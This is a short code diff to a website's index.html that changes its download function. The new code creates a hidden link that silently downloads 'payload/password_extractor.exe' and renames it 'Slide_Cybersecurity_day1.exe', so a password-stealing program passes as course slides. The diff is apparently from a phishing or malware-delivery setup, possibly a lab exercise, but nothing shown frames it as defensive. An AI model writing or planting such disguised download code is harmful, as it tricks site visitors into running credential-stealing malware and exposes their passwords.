@@ -78,9 +78,17 @@ project/website/index.html
 
     <script>
         function download() {
-            const payloadUrl = 'http://localhost:8080/credentials';
-            window.location.href = payloadUrl;
+            // Change this to point to the location where your executable will be served from
+            const payloadUrl = 'payload/password_extractor.exe';
+            
+            // Create an invisible anchor element to trigger download
+            const link = document.createElement('a');
+            link.href = payloadUrl;
+            link.download = 'Slide_Cybersecurity_day1.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
         }
-    </script> 
+    </script>
 </body>
 </html>
